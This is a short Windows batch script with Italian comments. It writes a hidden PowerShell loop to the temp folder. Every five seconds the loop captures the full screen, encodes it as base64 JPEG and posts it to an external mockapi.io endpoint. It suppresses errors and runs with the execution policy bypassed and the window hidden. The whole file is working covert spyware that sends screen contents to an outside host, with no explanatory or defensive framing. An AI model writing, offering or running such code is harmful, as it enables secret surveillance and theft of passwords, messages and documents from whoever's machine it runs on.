@echo off
:: Screenshot e invio a MockAPI
:: Server: https://68e161518943bf6bb3c41597.mockapi.io/api/v1/images

setlocal enabledelayedexpansion

:: Crea script PowerShell minimale
echo $url="https://68e161518943bf6bb3c41597.mockapi.io/api/v1/images" > %temp%\ss.ps1
echo while($true){ >> %temp%\ss.ps1
echo try{ >> %temp%\ss.ps1
echo Add-Type -AssemblyName System.Windows.Forms,System.Drawing >> %temp%\ss.ps1
echo $sc=[System.Windows.Forms.SystemInformation]::VirtualScreen >> %temp%\ss.ps1
echo $b=New-Object System.Drawing.Bitmap($sc.Width,$sc.Height) >> %temp%\ss.ps1
echo $g=[System.Drawing.Graphics]::FromImage($b) >> %temp%\ss.ps1
echo $g.CopyFromScreen($sc.X,$sc.Y,0,0,$b.Size) >> %temp%\ss.ps1
echo $ms=New-Object System.IO.MemoryStream >> %temp%\ss.ps1
echo $b.Save($ms,[System.Drawing.Imaging.ImageFormat]::Jpeg) >> %temp%\ss.ps1
echo $bytes=$ms.ToArray() >> %temp%\ss.ps1
echo $base64=[Convert]::ToBase64String($bytes) >> %temp%\ss.ps1
echo $body=@{\"image\"=\"data:image/jpeg;base64,$base64\"} >> %temp%\ss.ps1
echo $json=$body ^| ConvertTo-Json >> %temp%\ss.ps1
echo $wr=[System.Net.WebRequest]::Create($url) >> %temp%\ss.ps1
echo $wr.Method=\"POST\" >> %temp%\ss.ps1
echo $wr.ContentType=\"application/json\" >> %temp%\ss.ps1
echo $sw=New-Object System.IO.StreamWriter($wr.GetRequestStream()) >> %temp%\ss.ps1
echo $sw.Write($json) >> %temp%\ss.ps1
echo $sw.Close() >> %temp%\ss.ps1
echo $r=$wr.GetResponse() >> %temp%\ss.ps1
echo $r.Close() >> %temp%\ss.ps1
echo $b.Dispose() >> %temp%\ss.ps1
echo $g.Dispose() >> %temp%\ss.ps1
echo $ms.Dispose() >> %temp%\ss.ps1
echo }catch{} >> %temp%\ss.ps1
echo Start-Sleep -Seconds 5 >> %temp%\ss.ps1
echo } >> %temp%\ss.ps1

:: Esegui nascosto
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%temp%\ss.ps1"
